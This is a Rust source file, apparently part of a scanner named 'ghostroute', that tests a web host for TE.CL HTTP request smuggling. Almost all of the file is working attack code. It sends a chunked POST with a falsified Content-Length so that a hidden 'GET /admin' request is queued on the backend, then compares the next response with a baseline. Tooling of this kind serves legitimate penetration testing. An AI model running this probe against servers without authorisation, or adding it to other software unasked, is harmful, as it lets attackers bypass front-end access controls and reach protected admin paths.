use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    // Step 1: Baseline
    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;
    let baseline_len = baseline.body.len();

    // Step 2: TE.CL probe
    // Frontend uses TE (parses chunked body), backend uses CL (takes the body size from CL).
    // We send a chunked body where the chunks add up to more than the CL.
    // Backend will read only CL bytes, leaving the rest as the next request.

    let smuggled_req = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

    // The body: chunked encoding, but with a Content-Length that's smaller than the actual body.
    // We'll use chunked body: [smuggled bytes][terminator]
    // CL is set to a value smaller than the full body, so backend only reads up to CL
    // and the remaining bytes (the smuggled request) become the next request.

    let chunked_body = h1::build_chunked_body(&[smuggled_req]);
    let fake_cl = 5; // CL says body is 5 bytes, but actual body is larger

    let mut tecl_req = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nContent-Length: {}\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
        host, fake_cl, String::from_utf8_lossy(&chunked_body)
    );

    if let Some(a) = auth {
        let mut bytes = tecl_req.into_bytes();
        a.apply_to_request(&mut bytes);
        tecl_req = String::from_utf8(bytes).map_err(|e| e.to_string())?;
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut conn = crate::net::connect(cfg).await?;

    conn.write_all(tecl_req.as_bytes())
        .await
        .map_err(|e| format!("TE.CL write error: {}", e))?;

    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    use tokio::time::timeout;
    use std::time::Duration;

    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(e)) => return Err(format!("Read error: {}", e)),
            Err(_) => break,
        }
        if buf.len() > 1_000_000 { break; }
        if buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() > 100 { break; }
    }

    let _first_resp = h1::parse_response(&buf)?;

    // Send second request
    let second_req = h1::build_request("GET", "/", host, &[], b"");
    conn.write_all(&second_req).await.map_err(|e| format!("TE.CL second write error: {}", e))?;

    let mut buf2 = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
            Ok(Err(e)) => return Err(format!("Read error: {}", e)),
            Err(_) => break,
        }
        if buf2.len() > 1_000_000 { break; }
    }

    let second_resp = h1::parse_response(&buf2)?;

    let vulnerable = second_resp.body != baseline.body
        || second_resp.status_code != baseline.status_code;

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);

    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "tecl".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second_resp.status_code,
        details: if vulnerable {
            Some(format!(
                "TE.CL confirmed: baseline {} ({}b) vs response {} ({}b)",
                baseline.status_code, baseline_len,
                second_resp.status_code, second_resp.body.len()
            ))
        } else {
            None
        },
        ..Default::default()
    })
}
